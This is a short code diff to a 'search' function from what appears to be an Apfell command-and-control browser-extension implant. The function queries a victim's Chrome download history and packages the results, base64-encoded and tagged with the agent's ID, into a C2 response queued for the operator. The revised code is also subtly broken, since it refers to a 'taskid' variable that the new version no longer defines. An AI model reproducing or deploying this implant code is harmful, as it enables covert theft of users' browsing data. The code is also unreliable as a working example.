@@ -1,15 +1,12 @@
-search = function(params) {
-    let args = JSON.parse(atob(params['data'].toString()));
-    let taskid = params['taskid'];
-    let tasktype = params['tasktype'];
+search = function(task) {
+    let args = JSON.parse(atob(task['params'].toString()));
     chrome.downloads.search(args, function(results) {
-        const data = btoa(unescape(encodeURIComponent(JSON.stringify(results, null, 2))));
-        const apfellmsg = CreateApfellMessage(2, apfell.apfellID, apfell.UUID, data.length, taskid, tasktype, data);
-        let meta = {};
-        meta["metatype"] = 3;
-        meta["metadata"] = apfellmsg;
-        const metaenvelope = JSON.stringify(meta);
-        out.push(metaenvelope);
+        response = {"task_id":taskid, "user_output":JSON.stringify(results, null, 2), "completed": true};
+        outer_response = {"action":"post_response", "responses":[response], "delegates":[]};
+        enc = JSON.stringify(outer_response);
+        final = apfell.apfellid + enc;
+        msg = btoa(unescape(encodeURIComponent(final)));
+        out.push(msg);
     });
 };
 
